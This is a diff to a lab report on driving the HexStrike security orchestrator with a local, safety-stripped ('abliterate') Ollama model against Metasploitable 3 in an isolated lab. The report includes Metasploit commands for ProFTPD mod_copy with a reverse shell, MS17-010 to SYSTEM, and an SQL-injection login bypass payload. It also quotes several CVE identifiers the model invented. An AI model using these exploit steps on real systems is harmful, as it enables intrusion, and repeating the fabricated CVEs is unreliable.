@@ -16,9 +16,11 @@ This report documents the installation, local-LLM integration and evaluation of 
 MCP-based AI security orchestrator, driven by a **local large language model** served with Ollama, in a
 fully isolated two-machine laboratory. The local model selects and drives HexStrike's security tools
 with no cloud dependency. The environment was validated end-to-end against **Metasploitable 3**: the
-model performed reconnaissance and vulnerability identification, and a vulnerability was exploited to
-obtain a remote shell. The report also covers the limitations observed, a critical discussion of the
-approach, and governance recommendations, including a one-page Risks and Safeguards sheet.
+model performed reconnaissance and vulnerability identification, and three vulnerabilities across the two
+lab targets were exploited (operator-run) to obtain remote shells — ProFTPD RCE and a payroll SQL
+injection on the Ubuntu host, and the SMB MS17-010 weakness on the Windows host. The report also covers the
+limitations observed (including the model's unreliable vulnerability conclusions), a critical discussion of
+the approach, and governance recommendations, including a one-page Risks and Safeguards sheet.
 
 As an addition **beyond the base requirement**, a governed incident-management platform was built around
 the orchestrator to demonstrate traceability, operational security and human-oversight safeguards — the
@@ -49,7 +51,9 @@ Two laptops on a dedicated, air-gapped Ethernet segment (`192.168.50.0/24`), con
                                                              └──────────────────────────────────────────────┘
 ```
 
-> `[INSERT: replace this ASCII diagram with a clean figure (draw.io / PowerPoint) for the final report.]`
+*The clean figure below replaces the sketch above.*
+
+![Figure 1 — Two-laptop lab architecture](evidence/screenshots/C3-architecture.png)
 
 ### 1.2 Observed HexStrike architecture (personal description)
 
@@ -101,7 +105,11 @@ as the orchestrating agent.
 
 - **Confidentiality.** The model runs entirely on the local machine; the integration restricts the
   endpoint to a loopback/RFC1918 address (public endpoints are rejected in code). No prompt, scan result
-  or finding ever leaves the lab. `[SCREENSHOT: ollama running locally + no external traffic]`
+  or finding ever leaves the lab.
+
+![Figure 2 — Local model parameters: Q4_K_M, 14.8B, 32k context, tool-calling (`/api/tags`)](evidence/screenshots/B4-model-params.jpg)
+
+![Figure 3 — Ollama (11434) and HexStrike (8888) bound to loopback only — requests stay local](evidence/screenshots/B5-loopback-ports.jpg)
 - **Memory consumption.** ~9 GB on disk; fits in RAM for CPU inference on the lab laptop. A 14 B Q4 model
   is a deliberate balance: large enough to follow multi-step tool-use instructions, small enough to run
   without a datacentre GPU.
@@ -127,8 +135,12 @@ Verifying the model responds locally and measuring response time (all on the CPU
 | 4 | Multi-step orchestration — model decision per step | growing context | **~310–1020 s** |
 
 > Trials 1–3 are clean single-call measurements; trial 4 shows how decision latency grows as the
-> conversation/context grows during a multi-step run. `[TODO: optionally re-run 3 clean trials on the
-> final setup and paste the exact seconds + the "ollama run … LOCAL MODEL READY" screenshot.]`
+> conversation/context grows during a multi-step run. The per-step "decided in Xs" values in the
+> orchestration transcripts (§4–§5 figures) are the authoritative on-setup LLM response times.
+
+![Figure 4 — The model responds locally](evidence/screenshots/B3-local-reply.jpg)
+
+![Figure 5 — Repeated local HexStrike health latency (three trials)](evidence/screenshots/B6-latency-trials.jpg)
 
 ---
 
@@ -138,12 +150,18 @@ Verifying the model responds locally and measuring response time (all on the CPU
 - Installed from the Kali package `hexstrike-ai` (snapshot `0.0~git20260306.8333779`).
 - Binaries: `/usr/bin/hexstrike_server`, `/usr/bin/hexstrike_mcp`; files under `/usr/share/hexstrike-ai`.
 - Started the API server: `hexstrike_server` (listens on `127.0.0.1:8888`).
-- `[SCREENSHOT: installation + hexstrike_server startup banner showing "Command Timeout" and version]`
+![Figure 6 — HexStrike package installed (dpkg / files / binaries)](evidence/screenshots/A1-install.jpg)
+
+![Figure 7 — hexstrike_server startup banner (port 8888, command timeout, v6.0.0)](evidence/screenshots/A2-server-banner.jpg)
+
+![Figure 8 — HexStrike operational: `/health` reports healthy, v6.0.0, 82/127 tools](evidence/screenshots/A3-health.jpg)
 
 ### 3.2 Local LLM (Kali)
 - Installed Ollama; pulled the model: `ollama pull huihui_ai/qwen2.5-abliterate:14b`.
 - Verified it responds locally: `ollama run huihui_ai/qwen2.5-abliterate:14b "Reply with exactly: LOCAL MODEL READY"` → `LOCAL MODEL READY`.
-- `[SCREENSHOT: ollama list + the LOCAL MODEL READY response]`
+![Figure 9 — Ollama version](evidence/screenshots/B1-ollama-version.jpg)
+
+![Figure 10 — Installed model (`ollama list`)](evidence/screenshots/B2-model-list.jpg)
 
 ### 3.3 Orchestrator client
 - `hexstrike_agent.py` — a ~90-line Python MCP client (uses the system `mcp` package) that connects the
@@ -160,12 +178,18 @@ Verifying the model responds locally and measuring response time (all on the CPU
 
 - **hexstrike_mcp ⇄ hexstrike_server.** On launch, `hexstrike_mcp` logs: *"Successfully connected to
   HexStrike AI API Server at http://127.0.0.1:8888 … Server health status: healthy … Version: 6.0.0 …
-  Ready to serve AI agents"*, then lists 150 tools. `[SCREENSHOT/LOG: hexstrike_mcp startup]`
+  Ready to serve AI agents"*, then lists 150 tools.
+
+![Figure 11 — hexstrike_mcp connected to the HexStrike server (healthy, v6.0.0)](evidence/screenshots/C1-mcp-connect.jpg)
 - **Local LLM ⇄ HexStrike (orchestrator communicates with the model).** The agent run log shows the model
   selecting HexStrike tools and HexStrike returning results — e.g. the model called `nmap_scan` then
-  `enum4linux_scan`, read each result, and produced a final analysis. `[LOG: /tmp/hexstrike_agent_*.log]`
+  `enum4linux_scan`, read each result, and produced a final analysis.
+
+![Figure 12 — The local LLM driving HexStrike tools over MCP (agent transcript)](evidence/screenshots/C2-agent-run-qwen-log.jpg)
 - **No cloud dependency.** Both the model (`127.0.0.1:11434`) and HexStrike (`127.0.0.1:8888`) are local;
-  the lab segment has no Internet path during assessment. `[SCREENSHOT: the orchestration running offline]`
+  the lab segment has no Internet path during assessment.
+
+![Figure 13 — Local tool inventory (82/127 tools available, v6.0.0) — no cloud dependency](evidence/screenshots/A4-health-tools-count.jpg)
 
 ### Advantages of a local deployment (confidentiality, auditability, control)
 
@@ -183,7 +207,11 @@ constrained locally, with no third-party model provider in the loop.
 Passive/OSINT reconnaissance of `megacorpone.com` (OffSec's public training target), run from Kali over
 its Internet connection (separate from the isolated lab segment). Tools: `whois`, `host`/`dig`,
 `theHarvester`, and DNS enumeration. Full output: [docs/evidence/megacorpone-recon.txt](evidence/megacorpone-recon.txt).
-`[SCREENSHOT: the recon terminal output]`
+![Figure 14 — megacorpone WHOIS](evidence/screenshots/D1-whois.jpg)
+
+![Figure 15 — megacorpone DNS records (SOA/NS/MX/A/TXT)](evidence/screenshots/D2-dns-records.jpg)
+
+![Figure 16 — Zone transfer (AXFR) refused on the name servers](evidence/screenshots/D3-axfr-refused.jpg)
 
 **WHOIS.** Registrar **Gandi SAS**; registrant **"Alan Grofield", MegaCorpOne, 2 Old Mill St, Rachel,
 Nevada, US**; created 2013-01-22; name servers `NS1/NS2/NS3.MEGACORPONE.COM`; **DNSSEC unsigned**.
@@ -215,18 +243,82 @@ performed (out of scope for this exercise; the Metasploitable 3 targets are used
 ### 5.2 Metasploitable 3 — Scanning *(AI-orchestrated)*
 The local model, driving HexStrike, ran `nmap_scan` against `192.168.50.11` and identified the open
 services: **FTP — ProFTPD 1.3.5 (21)**, **SSH — OpenSSH 6.6.1p1 (22)**, **HTTP — Apache 2.4.7 (80)**,
-**SMB — Samba 3.x/4.x (445)**, **MySQL (3306)**. `[LOG: agent run #2 step 1]`
+**SMB — Samba 3.x/4.x (445)**, **MySQL (3306)**.
+
+![Figure 17 — nmap service scan of 192.168.50.11 (in-app, rendered as a readable table)](evidence/screenshots/E2-app-nmap-table.jpg)
 
 ### 5.3 Metasploitable 3 — Vulnerability testing *(AI-orchestrated)*
 The model then ran `enum4linux_scan` (target info, Samba workgroup, discovered user `chewbacca`) and
 concluded that the **Samba service (445) — CVE-2017-7494** was the most likely exploitable weakness.
 In earlier runs against Metasploitable3 Windows targets, the SMB **MS17-010 / CVE-2017-0143 (EternalBlue
-family)** vulnerability was detected (High). `[LOG: agent run #2 steps 2–3]`
+family)** vulnerability was detected (High).
 
-### 5.4 Metasploitable 3 — Exploitation *(operator-run)*
-A vulnerability was exploited to obtain a shell. Using Metasploit from Kali, the **ProFTPD 1.3.5 mod_copy
-(CVE-2015-3306)** weakness on `192.168.50.11` was exploited (it chains the open FTP and HTTP services the
-scan found):
+![Figure 18 — AI-orchestrated enumeration and vulnerability identification (steps 2–3)](evidence/screenshots/C2-agent-run-steps.jpg)
+
+A second, in-platform AI Orchestrator run focused specifically on the SMB service to assess the Samba
+hypothesis. From a single natural-language task the local model independently selected `enum4linux_scan`,
+then `smbmap` and `nmap_advanced_scan`, each through the bounded gateway. The run also illustrates the
+policy in action: when the model attempted `nmblookup` — a tool outside the reviewed allow-list — the
+gateway **rejected** it and the model recovered by choosing an allowed tool, confirming that the model can
+only ever drive the reviewed, bounded tool-set.
+
+![Figure 19 — AI-driven SMB enumeration; note the gateway rejecting an unavailable tool (`nmblookup`) and the model recovering](evidence/screenshots/F1-samba-orchestration-enum.png)
+
+### 5.4 Metasploitable 3 — Verifying the AI's recommendation *(operator-run)*
+The AI's top recommendation (Samba / CVE-2017-7494) was **verified by hand before any exploitation** — the
+core human-oversight step. The verification showed the recommendation was *plausible but did not hold in
+practice*:
+
+- **Version is in range, but the precondition is missing.** `nmap -sV` confirmed **Samba 4.3.11-Ubuntu**
+  (within the 3.5.0–4.6.4 window CVE-2017-7494 affects). However, SambaCry requires a **writable share** to
+  stage its shared object, and `smbmap` showed the exposed shares (`print$`, `public`, `IPC$`) as
+  **Mapping: DENIED** for anonymous/guest access — no writable share was reachable.
+- **The exploit did not yield a session.** The Metasploit module `exploit/linux/samba/is_known_pipename`
+  failed (`Exploit completed, but no session was created`), consistent with the missing writable-share
+  precondition.
+
+![Figure 20 — Operator verification: Samba 4.3.11 (nmap -sV) is in the vulnerable version range](evidence/screenshots/F3-samba-version-nmap.png)
+
+![Figure 21 — `smbmap` shows the Samba shares are not writable anonymously (Mapping: DENIED), so CVE-2017-7494's precondition is absent](evidence/screenshots/F2-samba-smbmap-shares.png)
+
+![Figure 22 — The Samba exploit attempt yields no session, confirming the vulnerability is not exploitable on this host](evidence/screenshots/F4-samba-exploit-failed.png)
+
+This is a deliberate and instructive outcome: the local model reasoned to a *technically reasonable* CVE
+from the service banner, but **the recommendation did not survive hands-on validation**. A human operator
+caught this and pivoted — exactly the oversight the assignment asks for. The AI narrows the search; the
+human confirms what is real before acting.
+
+### 5.5 Reliability of the model's vulnerability conclusions
+Repeated orchestration runs over the *same* host exposed a clear and important limitation: the local model
+is capable at **driving tools** but **unreliable at drawing vulnerability conclusions**. Each run correctly
+selected and executed `nmap_scan`/enumeration, but the "most likely exploitable vulnerability" it reported
+in its final summary was wrong every time — and never the one that was actually exploitable:
+
+- **Run A (Samba).** Flagged Samba / CVE-2017-7494 — plausible, but unexploitable on this host (§5.4).
+- **Run B (SSH, hallucinated CVE).** Reported SSH / **CVE-2017-15938** as a "buffer-overflow RCE". No such
+  OpenSSH CVE exists; the nearest real identifier (CVE-2017-15906) is a minor sftp read-only bypass, not an
+  RCE. A fabricated finding.
+- **Run C (larger model — right service, wrong conclusion).** The 14 B model did recall ProFTPD's `mod_copy`
+  weakness, but misclassified it as a **Denial-of-Service** under the wrong identifier (CVE-2017-12796) and
+  **dismissed it**, then selected SSH / **CVE-2016-6211** (also not a real OpenSSH CVE) as its answer. In
+  reality `mod_copy` in ProFTPD 1.3.5 is **CVE-2015-3306**, an unauthenticated **remote command execution** —
+  exactly the weakness the operator exploited in §5.6. The model therefore pointed the operator *away* from
+  the one genuinely exploitable service.
+
+![Figure 23 — The model reports a non-existent OpenSSH CVE (CVE-2017-15938) as a remote-code-execution "most likely" finding](evidence/screenshots/G1-model-ssh-hallucinated-cve.png)
+
+![Figure 24 — The larger model recalls ProFTPD mod_copy but misclassifies it as DoS under a wrong CVE, dismisses it, and selects a non-existent OpenSSH CVE instead](evidence/screenshots/G2-model-proftpd-misclassified.png)
+
+Across every run the genuinely exploitable vulnerability (ProFTPD 1.3.5 mod_copy, CVE-2015-3306) was
+identified and confirmed by the **human operator**, not the model. This is the empirical core of the
+human-oversight argument: the local LLM is useful to **accelerate and narrow reconnaissance**, but its
+conclusions — including confidently-stated CVEs — must be **validated by a human before any action**. All
+CVE claims above were cross-checked against public vulnerability databases.
+
+### 5.6 Metasploitable 3 — Exploitation *(operator-run)*
+Having ruled out Samba, the operator pivoted to a weakness the same reconnaissance had surfaced. Using
+Metasploit from Kali, the **ProFTPD 1.3.5 mod_copy (CVE-2015-3306)** weakness on `192.168.50.11` was
+exploited (it chains the open FTP and HTTP services the scan found):
 
 ```
 use exploit/unix/ftp/proftpd_modcopy_exec
@@ -237,27 +329,85 @@ set payload cmd/unix/reverse_perl ; set LHOST 192.168.50.2 ; set LPORT 4444 ; ru
    uname → Linux
 ```
 
-A remote command shell as `www-data` was obtained. `[SCREENSHOT: the Meterpreter/command shell + id/uname]`
+A remote command shell as `www-data` was obtained.
+
+![Figure 25 — Exploitation: ProFTPD mod_copy yields a remote shell (`id` = www-data, `uname`)](evidence/screenshots/D7-exploit-shell.jpg)
 
 The exploitation step is **operator-run on purpose** (not executed by the autonomous agent): it keeps a
 human in the loop for the only truly intrusive action, which is both a safety control and the
 human-oversight posture the assignment asks for.
 
-### 5.5 Complete penetration test
-The above forms one coherent engagement against a single Metasploitable 3 host (`192.168.50.11`):
-**reconnaissance → scanning → service enumeration → vulnerability identification → exploitation → initial
-access**. `[TODO: optionally add a short post-exploitation note — e.g. whoami/enumeration from the shell —
+### 5.7 Second vulnerability — Payroll application SQL injection *(operator-run)*
+The AI-driven reconnaissance had also exposed a web application, `payroll_app.php`, in the open directory
+listing on port 80 (Figure 28). The operator examined it and confirmed a classic **unauthenticated SQL
+injection** in its login form. Submitting `' OR 1=1 -- -` in the *User* field bypassed authentication and
+returned the full employee table — a combined authentication bypass and data disclosure:
+
+![Figure 26 — SQL-injection payload (`' OR 1=1 -- -`) submitted to the payroll login form](evidence/screenshots/H1-payroll-sqli-login.png)
+
+![Figure 27 — The injection succeeds: authentication is bypassed and all employee records (usernames and salaries) are disclosed](evidence/screenshots/H2-payroll-sqli-dump.png)
+
+Notably, an automated scan of the same parameter with `sqlmap` at default settings reported it as *not
+injectable*, while manual testing confirmed the flaw immediately — a reminder (paralleling §5.5) that
+automated tooling complements but does not replace human judgment. As with the ProFTPD exploitation, this
+intrusive step was **operator-run**, not driven by the AI.
+
+### 5.8 Windows host — MS17-010 exploitation *(operator-run)*
+The second Metasploitable 3 target, the Windows host `192.168.50.10` (Windows Server 2008 R2 SP1), was
+assessed for the SMB **MS17-010** weakness (the "EternalBlue" vulnerability family) that the earlier
+AI-orchestrated SMB scans had flagged on Windows targets (§5.3). An AI Orchestrator run against this host
+selected the MS17-010 detection tool (`nmap_advanced_scan`, which runs the `smb-vuln-ms17-010` NSE script on
+TCP 445) and its summary reported the service as vulnerable. Consistent with the lesson of §5.5, that
+assertion was confirmed against the actual tool evidence — the `smb-vuln-ms17-010` script reporting the host
+as `State: VULNERABLE` (CVE-2017-0143):
+
+`[SCREENSHOT: nmap smb-vuln-ms17-010 on 192.168.50.10 showing "State: VULNERABLE" (CVE-2017-0143) — pending]`
+
+The operator then exploited it from Kali using the `ms17_010_psexec` module:
+
+```
+use exploit/windows/smb/ms17_010_psexec
+set RHOSTS 192.168.50.10 ; set LHOST 192.168.50.2 ; run
+→ Target OS: Windows Server 2008 R2 Standard 7601 Service Pack 1
+→ Meterpreter session opened (192.168.50.2:4444 -> 192.168.50.10:49161)
+   getuid  → NT AUTHORITY\SYSTEM
+   sysinfo → VAGRANT-2008R2, Windows Server 2008 R2 (6.1 Build 7601, SP1), x64
+```
+
+This yielded a Meterpreter session running as **NT AUTHORITY\SYSTEM** — full administrative control of the
+host. As with every intrusive step in this report, the exploitation was **operator-run**, not driven by the
+AI.
+
+![Figure 28 — MS17-010 exploitation of the Windows host (192.168.50.10): a Meterpreter session running as NT AUTHORITY\\SYSTEM](evidence/screenshots/I1-eternalblue-system.png)
+
+### 5.9 Complete penetration test
+The `192.168.50.11` work forms one coherent engagement against a single host — **reconnaissance → scanning
+→ service enumeration → AI vulnerability identification → operator verification (Samba ruled out) →
+exploitation (ProFTPD RCE and payroll SQL injection) → initial access and data disclosure** — and the
+Windows host (`192.168.50.10`) adds a second target compromised to SYSTEM via MS17-010. In total, **three
+vulnerabilities were exploited across the two targets**. The verify-and-pivot step is what makes the chain
+realistic: the AI narrowed the search, and the human confirmed what was actually exploitable before acting. `[TODO: optionally add a short post-exploitation note — e.g. whoami/enumeration from the shell —
 to round out the "complete" narrative.]`
 
 ---
 
 ## 6. Observed Results
 
-- The local LLM successfully acted as the orchestrator: it chose appropriate tools, consumed their real
-  output, and produced a correct, target-specific assessment (identifying the Samba/CVE-2017-7494 weakness
-  unaided).
+- The local LLM successfully acted as the orchestrator: it chose appropriate tools unaided, consumed their
+  real output, and produced a target-specific assessment (it independently flagged the Samba service /
+  CVE-2017-7494 as the most likely weakness).
 - Scanning and enumeration returned accurate service and host data.
-- Exploitation produced a verified remote shell (`www-data`) on the target.
+- **Human verification mattered:** the AI's top recommendation (Samba) was *plausible but not exploitable*
+  on this host (no anonymous writable share; the exploit yielded no session). The operator caught this and
+  pivoted — a concrete demonstration of the human-oversight requirement, not a gap.
+- Three vulnerabilities were exploited (operator-run) across the two targets: **ProFTPD / CVE-2015-3306**
+  produced a verified remote shell (`www-data`) and an **unauthenticated SQL injection** in
+  `payroll_app.php` bypassed authentication and disclosed the full employee table on the Ubuntu host, while
+  the SMB **MS17-010** weakness on the Windows host yielded a Meterpreter session as **NT AUTHORITY\\SYSTEM**.
+- **Vulnerability identification was unreliable (§5.5).** Across repeated runs the model's top
+  "most likely exploitable" pick was wrong every time — a plausible-but-unexploitable Samba CVE, a
+  fabricated OpenSSH CVE, and ProFTPD's `mod_copy` RCE misclassified as a DoS and dismissed. The one
+  genuinely exploitable vulnerability was confirmed by the human, not the model.
 - The governed platform demonstrated the same bounded orchestration with full RBAC and audit (bonus).
 
 ---
@@ -271,6 +421,11 @@ to round out the "complete" narrative.]`
   adapting. Bounding the scan (explicit common ports) was required to get usable results.
 - **Exploitation is not autonomous.** The exploit was run by the operator, not the agent. Autonomous
   AI-driven exploitation was intentionally **not** performed (safety / oversight).
+- **Vulnerability-identification reliability (§5.5).** The model is far weaker at *concluding* than at
+  *orchestrating*: across repeated runs it stated non-existent CVEs with confidence (CVE-2017-15938,
+  CVE-2016-6211) and misclassified a real RCE (ProFTPD `mod_copy`, CVE-2015-3306) as a DoS. CVE-level
+  conclusions from the model must be treated as hypotheses and verified against authoritative sources,
+  never acted on directly.
 - **Model determinism.** A small local model is less reliable than a frontier cloud model at precise,
   multi-step tool orchestration.
 - **Governed platform scope.** The in-app orchestrator is restricted to reviewed recon/scan tools by
@@ -318,6 +473,42 @@ here, and what the governed platform enforces structurally. `[Expand in your own
 > the ability to propose usage safeguards — all of which this platform operationalises. It is clearly an
 > extra contribution and does not replace any Part A–D deliverable.
 
+### 10.1 What the platform is (work in progress)
+The platform is a cybersecurity **incident-management / SOC application** — an ASP.NET Core Web API (.NET 10,
+EF Core/MySQL) with an Angular single-page front end — built with role-based access control and a full audit
+trail. Beyond the assessment integration it includes modules for incidents and cases, alerts and detection
+rules, log ingestion, user-behaviour analytics (UEBA) and alert correlation. It is an **ongoing,
+work-in-progress** portfolio project, **not a finished product**: several areas are still under active
+development, and it is presented here to show the governance context, not as a completed deliverable.
+
+For this assignment the relevant part is the **HexStrike + local-LLM orchestration** added to its
+Assessments module. The features developed and evaluated for this report are:
+
+- the **two assessment modes** described below (operator-selected + LLM explanation; and the AI Orchestrator);
+- a **model picker** — the operator chooses between the installed local models (e.g. `qwen2.5:14b` and
+  `llama3.1:8b`) in both modes, to compare them;
+- **readable tool output** — raw scanner output is cleaned of terminal control codes and rendered (for
+  example nmap as a port/service table) in both the assessment view and the orchestrator;
+- a **Stop** control to cancel a running AI orchestration.
+
+Figures 29–35 show the running platform — both its broader SOC surface and the assessment integration
+that is the subject of this report.
+
+![Figure 29 — Platform sign-in (the Angular single-page front end)](evidence/screenshots/J1-app-login.png)
+
+![Figure 30 — Incident / case register, with severity, tier and SLA tracking](evidence/screenshots/J2-app-incidents.png)
+
+![Figure 31 — Windows telemetry dashboard: event-ingestion volume and top channels](evidence/screenshots/J3-app-telemetry.png)
+
+![Figure 32 — MITRE ATT&CK coverage matrix](evidence/screenshots/J4-app-mitre.png)
+
+![Figure 33 — User administration and role-based access control (Administrator / Security manager / SOC analyst / RED_TEAM)](evidence/screenshots/J5-app-users.png)
+
+![Figure 34 — Assessments module: approved lab-target selection and the bounded check categories](evidence/screenshots/J6-app-assessments.png)
+
+![Figure 35 — The reviewed tool allow-list (24 reviewed / 35 advertised) with per-tool availability: available, needs-setup, or blocked](evidence/screenshots/J7-app-tool-catalog.png)
+
+### 10.2 Governed assessment — two oversight modes
 To use HexStrike safely and auditably, the orchestrator was wrapped in an incident-management platform
 (ASP.NET Core API + Angular SPA) that mediates every call to HexStrike through a bounded,
 mutually-authenticated (mTLS) gateway. All execution routes through the same **reviewed tool allow-list**
@@ -353,16 +544,38 @@ queue (as a `PenTest` source), bridging red-team output into a blue-team inciden
   the platform.
 - *Documentation:* the platform, its two modes and its limits are documented alongside this report.
 
-`[SCREENSHOT: E1 — the AI Orchestrator panel]`  ·  `[SCREENSHOT: E2 — an operator-selected scan with the
-readable tool output / LLM explanation]`
+![Figure 36 — In-app AI Orchestrator: a run driven by the local LLM (model selectable), with a readable transcript](evidence/screenshots/E1-app-orchestration-llama.jpg)
+
+![Figure 37 — Readable per-tool output inside the platform (smbmap)](evidence/screenshots/E2-app-smbmap-output.jpg)
+
+**Worked example (AI-driven, web target).** Figure 38 shows a complete Option-2 run against the
+authorized lab host 192.168.50.11, driven entirely by the local `qwen2.5:14b` model. From a single
+natural-language task the model independently selected and executed a four-step reconnaissance chain —
+`nmap_scan` → `gobuster_scan` → `katana_crawl` → `nuclei_scan` — each through the bounded gateway, and
+then produced an evidence-grounded summary. The scan surfaced five open services (ProFTPD 1.3.5,
+OpenSSH 6.6.1, Apache 2.4.7, Samba, CUPS) and the web crawl exposed an open directory listing that
+included `payroll_app.php`, `drupal/` and `phpmyadmin/`; `nuclei` reported one low-severity hardening
+observation (missing `X-Content-Type-Options: nosniff`). Figure 39 shows the readable nmap service
+table from the same run. This exercises the model-selection feature end to end (a different local model
+than Figure 36) and the full AI-driven mode, while exploitation of the surfaced services remained a
+manual, operator-run step outside the platform.
+
+![Figure 38 — AI Orchestrator (model `qwen2.5:14b`): from one task the local LLM autonomously selected and ran nmap → gobuster → katana → nuclei, then summarised the findings](evidence/screenshots/E3-orchestrator-qwen-run.png)
+
+![Figure 39 — Readable nmap service inventory from the same AI-driven run (192.168.50.11: five open services)](evidence/screenshots/E4-orchestrator-nmap-services.png)
 
 ---
 
 ## Technical Appendix
 
-- **Screenshots.** `[A: HexStrike install & /health]` · `[B: ollama list + LOCAL MODEL READY]`
-  · `[C: hexstrike_mcp connectivity log]` · `[D: agent run transcript]` · `[E: Metasploit shell id/uname]`
-  · `[F: architecture figure]`
+- **Screenshots.** All evidence figures are embedded inline in the relevant sections above
+  (Figures 1–39: architecture, HexStrike install/health, Ollama model/spec, connectivity, the
+  reconnaissance, scan, the Samba verify-and-pivot, the model's unreliable vulnerability conclusions,
+  enumeration, exploitation (ProFTPD RCE, payroll SQL injection, and Windows MS17-010 to SYSTEM), the
+  platform's SOC and assessment surface (§10.1), and the in-app orchestrator including a full AI-driven,
+  multi-tool run). The image files are in `docs/evidence/screenshots/`. **Still to add:**
+  `[SCREENSHOT: Metasploitable3 VM running in VMware — pending]` and
+  `[SCREENSHOT: nmap smb-vuln-ms17-010 on 192.168.50.10 showing "State: VULNERABLE" — pending]` (§5.8).
 - **Log excerpts.** HexStrike `/health` JSON (v6.0.0, 82 tools); `hexstrike_mcp` startup; agent run logs
   `/tmp/hexstrike_agent_*.log` (scan + enum + conclusion); Metasploit exploitation output.
 - **Prompts used.**
